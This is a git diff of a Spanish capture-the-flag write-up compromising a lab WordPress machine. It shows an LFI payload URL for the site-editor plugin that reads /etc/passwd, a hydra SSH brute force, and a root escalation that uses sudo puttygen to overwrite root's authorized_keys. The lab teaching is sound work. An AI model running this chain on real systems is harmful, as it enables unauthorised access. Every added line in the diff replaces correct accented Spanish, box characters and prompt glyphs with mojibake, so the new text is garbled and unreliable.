@@ -12,11 +12,11 @@ Fecha: 2026-02-12
 Lo primero que realizaremos sera un escaneo para identificar puertos y servicios abiertos:
 
 ```bash
- settarget 172.17.0.2
+¯é░ settarget 172.17.0.2
 TARGET establecido: 172.17.0.2
 
- gomap -s $TARGET
-🎯 Scanning 172.17.0.2 (997 ports)
+¯é░ gomap -s $TARGET
+­ƒÄ» Scanning 172.17.0.2 (997 ports)
 
  PORT    STATE  SERVICE      VERSION
 22 open ssh SSH-2.0 - OpenSSH 9.2p1
@@ -31,44 +31,44 @@ Empecemos por la web a ver que tenemos.
 
 <img width="1797" height="826" alt="Pasted image 20260211161159" src="https://github.com/user-attachments/assets/9d649832-8f02-4d82-8aa3-2d7df3d445b6" />
 
-Nos encontramos con la pagina mal maquetada y sin imágenes, por consiguiente pasaremos el ratón por encima de algún enlace para ver si hay dominio al que apunten o usando CTR+U para ver el código de la web y comprobarlo.
+Nos encontramos con la pagina mal maquetada y sin im├ígenes, por consiguiente pasaremos el rat├│n por encima de alg├║n enlace para ver si hay dominio al que apunten o usando CTR+U para ver el c├│digo de la web y comprobarlo.
 
 <img width="1260" height="608" alt="Pasted image 20260211161716" src="https://github.com/user-attachments/assets/33bc3963-84ec-43d4-905e-886bac2d0191" />
 
 Efectivamente necesitamos indicar en nuestro **/etc/hosts** el dominio de esta web
 
 ```bash
- sudo nano /etc/hosts
+¯é░ sudo nano /etc/hosts
 
- cat /etc/hosts                             
-───────┬─────────────────────────────────────────────────────────────────────────
-       │ File: /etc/hosts
-───────┼─────────────────────────────────────────────────────────────────────────
-   1   │ 127.0.0.1   localhost
-   2   │ 127.0.1.1   jd-sec.intracof.local   jd-sec
-   3   │ 
-   4   │ # The following lines are desirable for IPv6 capable hosts
-   5   │ ::1     localhost ip6-localhost ip6-loopback
-   6   │ ff02::1 ip6-allnodes
-   7   │ ff02::2 ip6-allrouters
-   8   │ 
-   9   │ 172.17.0.2 asucar.dl
-───────┴─────────────────────────────────────────────────────────────────────────
+¯é░ cat /etc/hosts                             
+ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö¼ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+       Ôöé File: /etc/hosts
+ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö╝ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+   1   Ôöé 127.0.0.1   localhost
+   2   Ôöé 127.0.1.1   jd-sec.intracof.local   jd-sec
+   3   Ôöé 
+   4   Ôöé # The following lines are desirable for IPv6 capable hosts
+   5   Ôöé ::1     localhost ip6-localhost ip6-loopback
+   6   Ôöé ff02::1 ip6-allnodes
+   7   Ôöé ff02::2 ip6-allrouters
+   8   Ôöé 
+   9   Ôöé 172.17.0.2 asucar.dl
+ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö┤ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
 ```
 
 Ahora al entrar por la url http://asucar.dl podremos ver la web, con algunos errores pero ya en condiciones.
 
-Al navegar por la web no encontramos ningún dato útil que nos pueda servir, solo tienen una entrada típica de la primera instalación:
+Al navegar por la web no encontramos ning├║n dato ├║til que nos pueda servir, solo tienen una entrada t├¡pica de la primera instalaci├│n:
 
 <img width="605" height="220" alt="Pasted image 20260211164454" src="https://github.com/user-attachments/assets/513b5d42-6bbb-46de-8546-03737ea7f696" />
 
 Ahora usaremos una herramienta para el reconocimiento de usuarios y plugins para ver si encontramos algo interesante.
 
 ```bash
- wpscan --url http://asucar.dl -e u,p
+¯é░ wpscan --url http://asucar.dl -e u,p
 ```
 
-Con el **-e** indicamos que queremos realizar un enumeración de *usuarios* y *plugins* obteniendo el siguiente resultado:
+Con el **-e** indicamos que queremos realizar un enumeraci├│n de *usuarios* y *plugins* obteniendo el siguiente resultado:
 
 ```bash
 [+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
@@ -170,9 +170,9 @@ Con el **-e** indicamos que queremos realizar un enumeración de *usuarios* y *p
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 ```
 
-El usuario que identificamos en la entrada es el único que encontramos en la enumeración, pero en los plugins vemos que tenemos **site-editor** que es vulnerable a un **LFI**.
+El usuario que identificamos en la entrada es el ├║nico que encontramos en la enumeraci├│n, pero en los plugins vemos que tenemos **site-editor** que es vulnerable a un **LFI**.
 
-Buscando en Internet este plugin y su versión damos con el CVE-2018-7422 el cual nos servira para ver los usuarios del */etc/passwd*, solo tenemos que poner en la url lo siguinete:
+Buscando en Internet este plugin y su versi├│n damos con el CVE-2018-7422 el cual nos servira para ver los usuarios del */etc/passwd*, solo tenemos que poner en la url lo siguinete:
 
 ```html
 http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
@@ -211,7 +211,7 @@ De esta manera podremos ver todos los usuarios del sistema.
 En este listado encontramos un usuario llamado ***curiosito*** el cual podremos usar desde **ssh** para intentar el acceso mediante *hydra*.
 
 ```bash
- hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
+¯é░ hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 17:05:02
@@ -222,10 +222,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 17:05:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-11 17:05:22
 ```
 
-Ya hemos obtenido un usuario para una conexión por **ssh** ahora nos conectaremos y empezaremos la escalada de privilegios.
+Ya hemos obtenido un usuario para una conexi├│n por **ssh** ahora nos conectaremos y empezaremos la escalada de privilegios.
 
 ```bash
- ssh curiosito@$TARGET      
+¯é░ ssh curiosito@$TARGET      
 The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
 ED25519 key fingerprint is: SHA256:uxPuaJueTWTbzOOOgHR9jKEuKfQzpWt1rU8JihuRr4o
 This key is not known by any other names.
@@ -252,15 +252,15 @@ User curiosito may run the following commands on 988e23ca99ad:
     (root) NOPASSWD: /usr/bin/puttygen
 ```
 
-Vemos que hay un binario que podemos usar para intentar una escalada, pero antes comprobaremos la web de https://gtfobins.org/ pero no encontramos resultados así que tendremos que buscar otra forma.
+Vemos que hay un binario que podemos usar para intentar una escalada, pero antes comprobaremos la web de https://gtfobins.org/ pero no encontramos resultados as├¡ que tendremos que buscar otra forma.
 
 ```bash
 curiosito@988e23ca99ad:~$ find / -perm 4000 2>/dev/null
 ```
 
-Intentamos la búsqueda de binarios con *suid* sin resultados.
+Intentamos la b├║squeda de binarios con *suid* sin resultados.
 
-Pero viendo que podemos ejecutar ***puttygen*** como **root** podremos creamos unas credenciales para conectarnos por *ssh* y así tener acceso al **root**.
+Pero viendo que podemos ejecutar ***puttygen*** como **root** podremos creamos unas credenciales para conectarnos por *ssh* y as├¡ tener acceso al **root**.
 
 Primero generamos una clave privada
 
@@ -268,7 +268,7 @@ Primero generamos una clave privada
 curiosito@988e23ca99ad:~$ ssh-keygen -t rsa -b 4096 -f /tmp/asucar -N ""
 ```
 
-Ahora convertiremos la clave privada con **puttygen** para añadirla al *root*
+Ahora convertiremos la clave privada con **puttygen** para a├▒adirla al *root*
 
 ```bash
 sudo puttygen /tmp/asucar \
@@ -276,7 +276,7 @@ sudo puttygen /tmp/asucar \
   -o /root/.ssh/authorized_keys
 ```
 
-Ahora tendríamos que poder entrar como **root** sin contraseña.
+Ahora tendr├¡amos que poder entrar como **root** sin contrase├▒a.
 
 ```bash
 curiosito@78285efe6287:~$ ssh -i /tmp/asucar root@127.0.0.1                                                                                                
@@ -301,21 +301,21 @@ root@78285efe6287:~# pwd
 root@78285efe6287:~#
 ```
 
-Con esto ya tendríamos  comprometida la maquina.
+Con esto ya tendr├¡amos  comprometida la maquina.
 
-## Conclusión
+## Conclusi├│n
 
-Este laboratorio demuestra cómo una **mala gestión de plugins en WordPress** puede derivar en una cadena completa de compromiso del sistema.  
-Una vulnerabilidad aparentemente limitada como un **LFI** permite la enumeración de usuarios, lo que combinado con **credenciales débiles** da acceso inicial al sistema.
+Este laboratorio demuestra c├│mo una **mala gesti├│n de plugins en WordPress** puede derivar en una cadena completa de compromiso del sistema.  
+Una vulnerabilidad aparentemente limitada como un **LFI** permite la enumeraci├│n de usuarios, lo que combinado con **credenciales d├®biles** da acceso inicial al sistema.
 
-Posteriormente, una **configuración insegura de sudo**, permitiendo ejecutar binarios sensibles como `puttygen` sin contraseña, facilita una escalada de privilegios limpia y silenciosa hasta **root**.
+Posteriormente, una **configuraci├│n insegura de sudo**, permitiendo ejecutar binarios sensibles como `puttygen` sin contrase├▒a, facilita una escalada de privilegios limpia y silenciosa hasta **root**.
 
 ### Puntos clave aprendidos
 
 - La importancia de mantener **plugins y CMS actualizados**.
 - El impacto real de un **LFI** bien aprovechado.    
 - El riesgo de conceder permisos `NOPASSWD` a binarios no controlados.
-- Cómo el abuso de **authorized_keys** sigue siendo una técnica muy efectiva en entornos mal configurados.
+- C├│mo el abuso de **authorized_keys** sigue siendo una t├®cnica muy efectiva en entornos mal configurados.
 
 ---
 Si te gusto puedes invitarme a un cafe.
